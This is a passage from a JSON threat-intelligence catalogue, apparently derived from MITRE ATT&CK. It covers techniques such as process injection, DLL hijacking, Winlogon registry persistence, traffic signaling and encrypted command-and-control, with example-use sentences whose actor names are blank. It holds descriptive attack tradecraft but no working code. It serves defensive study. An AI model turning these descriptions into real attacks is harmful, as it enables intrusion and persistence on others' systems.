      "has used the Adobe Reader icon for the downloaded file to look more trustworthy.",
      "installs malicious application bundles that mimic native macOS apps such as Safari by using the legitimate apps icon and customizing the `Info.plist` to match expected metadata.",
      "PE executable payloads have used uncommon but legitimate extensions such as `.com` instead of `.exe`.",
      "has used fake icons including antivirus and external drives to disguise malicious payloads.",
      "has masqueraded filenames using examples such as `update.py`.",
      "has prompted users to download and execute batch scripts that masquerade as legitimate update files during initial access and social engineering operations."
    ],
    "id": "T1036",
    "name": "Masquerading",
    "similar_words": [
      "Masquerading"
    ]
  },
  "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d": {
    "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
    "example_uses": [
      "has injected code into trusted processes.",
      "copies itself into a running Internet Explorer process to evade detection.",
      "A  tool can spawn svchost.exe and inject the payload into that process.",
      "injects into other processes to load modules.",
      "malware can download a remote access tool, NanoCore, and inject into another process.",
      "injects itself into various processes depending on whether it is low integrity or high integrity.",
      "If running in a Windows environment,  saves a DLL to disk that is injected into the explorer.exe process to execute the payload.  can also be configured to inject and execute within specific processes.",
      "can perform process injection by using a reflective DLL.",
      "injects its malware variant, , into the cmd.exe process.",
      "injects into the Internet Explorer process.",
      "injects into the svchost.exe process.",
      "creates a suspended svchost process and injects its DLL into it.",
      "is capable of injecting code into the APC queue of a created  process as part of an \"Early Bird injection.\"",
      "performs a reflective DLL injection using a given pid.",
      "uses a batch file to load a DLL into the svchost.exe process.",
      "has used Metasploit to perform reflective DLL injection in order to escalate privileges.",
      "downloads an executable and injects it directly into a new process.",
      "A  malware sample performs reflective DLL injection.",
      "has used various methods of process injection including hot patching.",
      "contains a collection of CodeExecution modules that enable by injecting code (DLL, shellcode) or reflectively loading a Windows PE file into a process.",
      "creates a backdoor through which remote attackers can inject files into running processes.",
      "can inject content into lsass.exe to load a module.",
      "can migrate into another process using reflective DLL injection.",
      "performs multiple process injections to hijack system processes and execute malicious code.",
      "injects itself into the secure shell (SSH) process.",
      "performs thread execution hijacking to inject its orchestrator into a running thread from a remote process.  performs a separate injection of its communication module into an Internet accessible process through which it performs C2.",
      "uses reflective DLL injection to inject the malicious library and execute the RAT.",
      "can inject a variety of payloads into processes dynamically chosen by the adversary.",
      "injects its DLL file into a newly spawned Internet Explorer process.",
      "will inject itself into different processes to evade detection. The selection of the target process is influenced by the security software that is installed on the system (Duqu will inject into different processes depending on which security suite is installed on the infected host).",
      "injects a DLL for  into the explorer.exe process.",
      "injects its DLL component into svchost.exe.",
      "performs code injection injecting its own functions to browser processes.",
      "injects itself into explorer.exe.",
      "injects DLL files into iexplore.exe.",
      "can perform DLL loading.",
      "After decrypting itself in memory,  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.",
      "can inject a malicious DLL into a process.",
      "can perform DLL injection.",
      "injects itself into running instances of outlook.exe, iexplore.exe, or firefox.exe.",
      "An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).",
      "can inject into known vulnerable binaries on targeted hosts.",
      "can migrate the loader into another process.",
      "can inject into running processes on a compromised host.",
      "can use an IronPython scripts to load a .NET injector to inject a payload into its own or a remote process.",
      "can inject itself into an existing explorer.exe process by using `RtlCreateUserThread`.",
      "can run shellcode it injects into a newly created process.",
      "can inject code into local and remote processes.",
      "can inject code through calling VirtualAllocExNuma.",
      "has injected a DLL library containing a Trojan into the fwmain32.exe process.",
      "has the ability to inject code into the svchost.exe iexplorer.exe explorer.exe and default browser processes.",
      "can inject itself into running processes on a compromised host.",
      "includes a subproject DonutTest to inject shellcode into a target process.",
      "has the ability to inject shellcode into svchost.exe.",
      "During  threat actors used malicious SparkGateway plugins to inject shared objects into web process memory on compromised Ivanti Secure Connect VPNs to enable deployment of backdoors.",
      "has the ability to inject shellcode into a donor processes that is started in a suspended state.  has previously used RegAsm as a donor process.",
      "malware has injected a Cobalt Strike beacon into Rundll32.exe.",
      "has used process injection to execute payloads to escalate privileges.",
      "can inject into the `wuauclt.exe` process to perform C2 actions.",
      "includes a binary labeled `authd` that can inject a library into a running process and then hook an existing function within that process with a new function from that library.",
      "can inject code from files to other running processes.",
      "can inject malicious code into process created by the Command_Create&Inject function.",
      "can inject code into system processes including notepad.exe svchost.exe and vbc.exe.",
      "has a command to hide itself through injecting into another process.",
      "can inject decrypted shellcode into the LanmanServer service.",
      "can inject shellcode directly into Excel.exe or a specific process.",
      "can inject into into running processes.",
      "can inject into the `svchost.exe` process for execution.",
      "has injected malicious code into legitimate .NET related processes including regsvcs.exe msbuild.exe and installutil.exe.",
      "binary is injected into memory via `WriteProcessMemory`.",
      "has relied on injecting its payload directly into the process memory of the victim's preferred browser.",
      "can inject itself into processes including explore.exe Iexplore.exe Mobsync.exe. and wermgr.exe.",
      "can inject code into multiple processes on infected endpoints.",
      "contains multiple modules for injecting into processes such as Invoke-PSInject.",
      "injects its malware variant  into the cmd.exe process.",
      "injects its communication module into an Internet accessible process through which it performs C2.",
      "can inject code into a targeted process by writing to the remote memory of an infected system and then create a remote thread.",
      "can inject itself into another process to avoid detection including use of a technique called ListPlanting that customizes the sorting algorithm in a ListView structure.",
      "During  threat actors injected code into a selected process which in turn launches a command as a child process of the original.",
      "has the ability to inject an agent module into a new process and arbitrary shellcode into running processes.",
      "During  threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.",
      "can inject a payload into the memory of a compromised host.",
      "injects into a newly spawned process created from a native Windows executable.",
      "dispatcher can inject itself into running processes to gain higher privileges and to evade detection.",
      "has injected itself into remote processes to encrypt files using a combination of VirtualAlloc WriteProcessMemory and CreateRemoteThread.",
      "has the ability to inject malicious DLLs into a specific process for privilege escalation.",
      "has used Win7Elevate to inject malicious code into explorer.exe.",
      "has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.",
      "has injected an install module into a newly created process.",
      "can use `VirtualAlloc` `WriteProcessMemory` and then `CreateRemoteThread` to execute shellcode within the address space of `Notepad.exe`.",
      "has injected into running processes.",
      "has been injected directly into a running process including `explorer.exe`.",
      "has the ability to directly inject its code into the web browser process.",
      "can start and inject code into a new `svchost` process.",
      "has used Nt*  functions to inject code into legitimate processes such as wermgr.exe.",
      "The  payload has been injected into the `logagent.exe` and `rdpclip.exe` processes.",
      "malware TIDYELF loaded the main WINTERLOVE component by injecting it into the iexplore.exe process.",
      "can inject its payload into iexplore.exe process.",
      "can inject the loader file Speech02.db into a process.",
      "During the   loaded  into svchost.exe which then launched iexplore.exe for their C2.",
      "has also used 's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.",
      "compromises the `.text` section of a legitimate system DLL in `%windir%` to hold the contents of retrieved plug-ins.",
      "has injected malicious payloads into the `explorer.exe` process.",
      "includes multiple methods to perform process injection to migrate the framework into other potentially privileged processes on the victim machine.",
      "initial execution included launching multiple `svchost` processes and injecting code into them.",
      "has injected  into `wuauclt.exe` during intrusions.  has injected ransomware into `svchost.exe` before encryption.",
      "included injecting code into the AAA and Crash Dump processes on infected Cisco ASA devices.",
      "injects into a newly-created `svchost.exe` process prior to device encryption."
    ],
    "id": "T1055",
    "name": "Process Injection",
    "similar_words": [
      "Process Injection"
    ]
  },
  "attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8": {
    "description": "Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s .bash_history file. For each user, this file resides at the same location: ~/.bash_history. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials. (Citation: External to DA, the OS X Way)",
    "example_uses": [],
    "id": "T1139",
    "name": "Bash History",
    "similar_words": [
      "Bash History"
    ]
  },
  "attack-pattern--451a9977-d255-43c9-b431-66de80130c8c": {
    "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)",
    "example_uses": [
      "provides a reverse shell is triggered upon receipt of a packet with a special string, sent to any port.",
      "provides additional access using its backdoor Espeon, providing a reverse shell upon receipt of a special packet",
      "During  threat actors sent a magic 48-byte sequence to enable the PITSOCK backdoor to communicate via the `/tmp/clientsDownload.sock` socket.",
      "can identify a specific string in intercepted network traffic `SSH-2.0-OpenSSH_0.3xx.` to trigger its command functionality.",
      "can modify the `DSUserAgentCap.pm` Perl module on Ivanti Connect Secure VPNs and either activate or deactivate depending on the value of the user agent in incoming HTTP requests.",
      "will connect to C2 only after sniffing a magic packet value in TCP or UDP packets matching specific conditions.",
      "can be sent instructions via special packets to change its functionality. Code for new functionality can be included in these messages.",
      "has used a passive listener capable of identifying a specific magic value before executing tasking as a secondary command and control (C2) mechanism.",
      "provides a reverse shell is triggered upon receipt of a packet with a special string sent to any port.",
      "provides additional access using its backdoor Espeon providing a reverse shell upon receipt of a special packet.",
      "is triggered by an incoming TCP connection to a legitimate service from a specific source port.",
      "can identify if incoming HTTP traffic contains a token and if so it will intercept the traffic and process the received command.",
      "has used Wake-on-Lan to power on turned off systems for lateral movement.",
      "can intercept the first client to server packet in the 3-way TCP handshake to determine if the packet contains the correct unique value for a specific  implant. If the value does not match the packet and the rest of the TCP session are passed to the legitimate listening application.",
      "can monitor TCP traffic for packets containing one of five different predefined parameters and will spawn a reverse shell if one of the parameters and the proper response string to a subsequent challenge is received.",
      "has redirected clients to legitimate Gmail Naver or Kakao pages if the clients connect with no parameters.",
      "has used  to redirect clients to legitimate Gmail Naver or Kakao pages if the clients connect with no parameters."
    ],
    "id": "T1205",
    "name": "Traffic Signaling",
    "similar_words": [
      "Port Knocking",
      "Traffic Signaling"
    ]
  },
  "attack-pattern--457c7820-d331-465a-915e-42f85500ccc4": {
    "description": "Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands.Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands.(Citation: split man page)(Citation: GTFO split)",
    "example_uses": [
      "lnk files used for persistence have abused the Windows Update Client (wuauclt.exe) to execute a malicious DLL.",
      "has used native tools and processes including living off the land binaries or LOLBins to maintain and expand access to the victim networks."
    ],
    "id": "T1218",
    "name": "System Binary Proxy Execution",
    "similar_words": [
      "Signed Binary Proxy Execution",
      "System Binary Proxy Execution"
    ]
  },
  "attack-pattern--45d84c8b-c1e2-474d-a14d-69b5de0a2bc0": {
    "description": "The source command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways source /path/to/filename [arguments] or . /path/to/filename [arguments]. Take note of the space after the \".\". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell's environment. \n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.",
    "example_uses": [],
    "id": "T1153",
    "name": "Source",
    "similar_words": [
      "Source"
    ]
  },
  "attack-pattern--46944654-fcc1-4f63-9dad-628102376586": {
    "description": "Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation. (Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search Order)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
    "example_uses": [
      "has performed DLL search order hijacking to execute their payload.",
      "can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.",
      "is likely loaded via DLL hijacking into a legitimate McAfee binary.",
      "A  variant uses DLL search order hijacking.",
      "contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.",
      "is launched through use of DLL search order hijacking to load a malicious dll.",
      "has used DLL search order hijacking.",
      "Variants of  achieve persistence by using DLL search order hijacking, usually by copying the DLL file to %SYSTEMROOT% (C:\\WINDOWS\\ntshrui.dll).",
      "uses search order hijacking of the Windows executable sysprep.exe to escalate privileges.",
      "abuses the Windows DLL load order by using a legitimate Symantec anti-virus binary, VPDN_LU.exe, to load a malicious DLL that mimics a legitimate Symantec DLL, navlu.dll.",
      "uses DLL search order hijacking for persistence by saving itself as ntshrui.dll to the Windows directory so it will load before the legitimate ntshrui.dll saved in the System32 subdirectory."
    ],
    "id": "T1038",
    "name": "DLL Search Order Hijacking",
    "similar_words": [
      "DLL Search Order Hijacking"
    ]
  },
  "attack-pattern--478aa214-2ca7-4ec0-9978-18798e514790": {
    "description": "When operating systems boot up, they can start programs or applications called services that perform background system functions. (Citation: TechNet Services) A service's configuration information, including the file path to the service's executable, is stored in the Windows Registry. \n\nAdversaries may install a new service that can be configured to execute at startup by using utilities to interact with services or by directly modifying the Registry. The service name may be disguised by using a name from a related operating system or benign software with [Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1035).",
    "example_uses": [
      "backdoor RoyalDNS established persistence through adding a service called Nwsapagent.",
      "creates a Registry subkey that registers a new service.",
      "has created new services to establish persistence.",
      "creates a Windows service to establish persistence.",
      "created new Windows services and added them to the startup directories for persistence.",
      "A  tool can create a new service, naming it after the config information, to gain persistence.",
      "can install itself as a new service.",
      "Some  variants create a new Windows service to establish persistence.",
      "adds a new service named NetAdapter to establish persistence.",
      "creates a new Windows service with the malicious executable for persistence.",
      "variants can add malicious DLL modules as new services.",
      "Some  variants install .dll files as services with names generated by a list of hard-coded strings.",
      "registers itself as a service by adding several Registry keys.",
      "creates a new service named WmiApSrvEx to establish persistence.",
      "installs a service pointing to a malicious DLL dropped to disk.",
      "creates a new service to establish.",
      "creates a backdoor through which remote attackers can create a service.",
      "creates new services to establish persistence.",
      "can add a new service to ensure  persists on the system when delivered as another payload onto the system.",
      "creates a Registry subkey that registers a new service.",
      "can install a new service.",
      "installs itself as a new service.",
      "installs itself as a service to maintain persistence.",
      "has a tool that creates a new service for persistence.",
      "If running as administrator,  installs itself as a new service named bmwappushservice to establish persistence.",
      "uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file.",
      "sets its DLL file as a new service in the Registry to establish persistence.",
      "can install as a Windows service for persistence.",
      "can be added as a service to establish persistence.",
      "uses Windows services typically named \"javamtsup\" for persistence.",
      "One variant of  creates a new service using either a hard-coded or randomly generated name.",
      "Some  samples install themselves as services for persistence by calling WinExec with the net start argument.",
      "creates Registry keys to allow itself to run as various services.",
      "One persistence mechanism used by  is to register itself as a Windows service.",
      "creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key.",
      "installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance.",
      "can create a new service named msamger (Microsoft Security Accounts Manager).",
      "establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start.",
      "creates a new service named “ntssrv” to execute the payload.",
      "is capable of configuring itself as a service.",
      "configures itself as a service.",
      "has registered itself as a service to establish persistence.",
      "installs itself as a service for persistence.",
      "Several  malware families install themselves as new services on victims.",
      "malware installs itself as a service to provide persistence and SYSTEM privileges."
    ],
    "id": "T1050",
    "name": "New Service",
    "similar_words": [
      "New Service"
    ]
  },
  "attack-pattern--4ae4f953-fe58-4cc8-a327-33257e30a830": {
    "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.",
    "example_uses": [
      "obtains application windows titles and then determines which windows to perform  on.",
      "gathers information about opened windows.",
      "captures window titles.",
      "can enumerate active windows.",
      "The discovery modules used with  can collect information on open windows.",
      "reports window names along with keylogger information to provide application context.",
      "is capable of enumerating application windows.",
      "has a command to get text of the current foreground window.",
      "malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.",
      "can obtain application window titles and then determines which windows to perform Screen Capture on.",
      "has the ability to identify open windows on the compromised host.",
      "can check the name of the window displayed on the system.",
      "gathers information about opened windows during the initial infection.",
      "can monitor the titles of open windows to identify specific keywords.",
      "will search for cryptocurrency wallets by examining application window names for specific strings.  extracts information collected via NirSoft tools from the hosting process's memory by first identifying the window through the FindWindow API function.",
      "can enumerate windows and child windows on a compromised host.",
      "has the ability to identify the titles of running windows on a compromised host.",
      "can identify installed security tools based on window names.",
      "saves the window names.",
      "can use `GetForegroundWindow` to enumerate the active window.",
      "can discover and close windows on controlled systems.",
      "has a command to capture active windows on the machine and retrieve window titles.",
      "has the ability to list the names of all open windows on the infected host.",
      "can enumerate all windows on the victims machine.",
      "can use the `GetForegroundWindow` and `GetWindowText` APIs to discover where the user is typing.",
      "can enumerate the active Window during keylogging through execution of `GetActiveWindowTitle`.",
      "has the ability to enumerate windows on a compromised host.",
      "has used a PowerShell-based keylogging tool to capture the window title.",
      "has the ability to list open windows on the compromised host.",
      "has the ability to discover application windows via execution of `EnumWindows`.",
      "can enumerate running application windows.",
      "has collected window title information from compromised systems."
    ],
    "id": "T1010",
    "name": "Application Window Discovery",
    "similar_words": [
      "Application Window Discovery"
    ]
  },
  "attack-pattern--4b74a1d4-b0e9-4ef1-93f1-14ecc6e2f5b5": {
    "description": "Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",
    "example_uses": [
      "uses AES to encrypt network communication.",
      "encrypts command and control communications with RC4.",
      "Some  samples encrypt C2 communications with RC4.",
      "has used the Plink utility to create SSH tunnels.",
      "used the Plink utility and other tools to create tunnels to C2 servers.",
      "can use SSL and TLS for communications.",
      "uses AES to encrypt certain information sent over its C2 channel.",
      "Some versions of  have used the hard-coded string “this is the encrypt key” for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.",
      "has used the Plink utility to tunnel RDP back to C2 infrastructure.",
      "has encrypted C2 traffic with RSA.",
      "provides a reverse shell connection on 8338/TCP, encrypted via AES.",
      "encrypts C2 data with AES256 in ECB mode.",
      "has used RC4 to encrypt C2 traffic.",
      "default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.",
      "contains a copy of the OpenSSL library to encrypt C2 traffic.",
      "Some  variants use SSL to encrypt C2 communications.",
      "Some  samples use AES to encrypt C2 traffic.",
      "has used RC4 encryption (for Datper malware) and AES (for xxmm malware) to obfuscate HTTP traffic.",
      "encrypts data sent to its C2 server over HTTP with RC4.",
      "uses RC4 encryption to obfuscate HTTP traffic.",
      "encrypts C2 traffic using RC4 with a static key.",
      "network loader encrypts C2 traffic with RSA and RC6.",
      "uses the Camellia cipher to encrypt communications.",
      "has encrypted C2 traffic with RC4, previously using keys of 88888888 and babybear.",
      "The  command and control protocol's data stream can be encrypted with AES-CBC.",
      "A variant of  encrypts some C2 with 3DES and RSA.",
      "uses RC4 to encrypt C2 responses.",
      "Some variants of  use RC4 to encrypt C2 traffic.",
      "can encrypt C2 traffic with AES.",
      "encrypts C2 traffic using an RC4 key.",
      "encrypts some C2 traffic with the Blowfish cipher.",
      "C2 traffic has been encrypted with RC4 and AES.",
      "encrypts the message body of HTTP traffic with RC2 (in CBC mode) and Base64 encoding.",
      "uses RC4 to encrypt C2 traffic.",
      "has used the  RAT, which communicates over HTTP with a payload encrypted with RC4.",
      "will decrypt resources it downloads with HTTP requests by using RC4 with the key \"ScoutEagle.\"",
      "encrypts exfiltrated data with RC4.",
      "uses SSL/TLS and RC4 to encrypt traffic.",
      "uses AES to encrypt C2 traffic.",
      "encrypts C2 traffic using AES with a static key.",
      "command and control commands are encrypted within the HTTP C2 channel using the DES algorithm in CBC mode with a key derived from the MD5 hash of the string HYF54&%9&jkMCXuiS.",
      "uses AES to encrypt C2 communications.",
      "encrypts C2 traffic with AES and RSA.",
      "encrypts C2 communications with RC4 as well as TLS.",
      "malware encrypts C2 traffic using RC4 with a hard-coded key.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "malware uses Caracachs encryption to encrypt C2 payloads.",
      "uses RC4 to encrypt the message body of HTTP content."
    ],
    "id": "T1032",
    "name": "Standard Cryptographic Protocol",
    "similar_words": [
      "Standard Cryptographic Protocol"
    ]
  },
  "attack-pattern--4be89c7c-ace6-4876-9377-c8d54cef3d63": {
    "description": "A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware. (Citation: Wikipedia Hypervisor) It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen. (Citation: Wikipedia Xen) A type-1 hypervisor operates at a level below the operating system and could be designed with [Rootkit](https://attack.mitre.org/techniques/T1014) functionality to hide its existence from the guest operating system. (Citation: Myers 2007) A malicious hypervisor of this nature could be used to persist on systems through interruption.",
    "example_uses": [],
    "id": "T1062",
    "name": "Hypervisor",
    "similar_words": [
      "Hypervisor"
    ]
  },
  "attack-pattern--4bf5845d-a814-4490-bc5c-ccdee6043025": {
    "description": "Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager are loaded into every process that calls the ubiquitously used application programming interface (API) functions: (Citation: Endgame Process Injection July 2017)\n\n* CreateProcess\n* CreateProcessAsUser\n* CreateProcessWithLoginW\n* CreateProcessWithTokenW\n* WinExec\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.",
    "example_uses": [
      "service-based DLL implant can execute a downloaded file with parameters specified using CreateProcessAsUser.",
      "can establish using a AppCertDLLs Registry key."
    ],
    "id": "T1182",
    "name": "AppCert DLLs",
    "similar_words": [
      "AppCert DLLs"
    ]
  },
  "attack-pattern--4eeaf8a9-c86b-4954-a663-9555fb406466": {
    "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) or [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).",
    "example_uses": [
      "can sleep for a specific time and be set to communicate at specific intervals.",
      "can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.",
      "creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.",
      "can sleep for a given number of seconds.",
      "collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.",
      "can set its \"beacon\" payload to reach out to the C2 server on an arbitrary and random interval. In addition it will break large data sets into smaller chunks for exfiltration.",
      "can be configured to reconnect at certain intervals.",
      "has the ability to wait for a specified time interval between communicating with and executing commands from C2.",
      "can pause C2 communications for a specified time.",
      "can be configured to exfiltrate data during nighttime or working hours.",
      "can be configured to only run during normal working hours which would make its communications harder to distinguish from normal traffic.",
      "has been programmed to sleep outside local business hours (9 to 5 Monday to Friday).",
      "collects compresses encrypts and exfiltrates data to the C2 server every 10 minutes.",
      "can configure its agent to work only in specific time frames.",
      "can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.",
      "can sleep when instructed to do so by the C2.",
      "sends stolen data to the C2 server every 10 minutes.",
      "sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.",
      "has sent data back to C2 every 8 hours.",
      "contacts its C2 based on a scheduled timing set in its configuration.",
      "can set itself to sleep before requesting a new command from C2."
    ],
    "id": "T1029",
    "name": "Scheduled Transfer",
    "similar_words": [
      "Scheduled Transfer"
    ]
  },
  "attack-pattern--514ede4c-78b3-4d78-a38b-daddf6217a79": {
    "description": "Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\\Software\\[Wow6432Node\\]Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ and HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\ are used to manage additional helper programs and functionalities that support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) \n\nMalicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)\n\n* Winlogon\\Notify - points to notification package DLLs that handle Winlogon events\n* Winlogon\\Userinit - points to userinit.exe, the user initialization program executed when a user logs on\n* Winlogon\\Shell - points to explorer.exe, the system shell executed when a user logs on\n\nAdversaries may take advantage of these features to repeatedly execute malicious code and establish Persistence.",
    "example_uses": [
      "established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.",
      "A  variant registers as a Winlogon Event Notify DLL to establish persistence.",
      "can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon."
    ],
    "id": "T1004",
    "name": "Winlogon Helper DLL",
    "similar_words": [
      "Winlogon Helper DLL"
    ]
  },
  "attack-pattern--519630c5-f03f-4882-825c-3af924935817": {
    "description": "Some security tools inspect files with static signatures to determine if they are known malicious. Adversaries may add data to files to increase the size beyond what security tools are capable of handling or to change the file hash to avoid hash-based blacklists.",
    "example_uses": [
      "apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.",
      "includes garbage code to mislead anti-malware software and researchers.",
      "Before writing to disk,  inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.",
      "contains junk code in its functions in an effort to confuse disassembly programs.",
      "appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.",
      "contains junk code in its binary, likely to confuse malware analysts.",
      "has inserted garbage characters into code, presumably to avoid anti-virus detection.",
      "has obfuscated DLLs and functions using dummy API calls inserted between real instructions.",
      "downloader code has included \"0\" characters at the end of the file to inflate the file size in a likely attempt to evade anti-virus detection.",
      "contains unused machine instructions in a likely attempt to hinder analysis.",
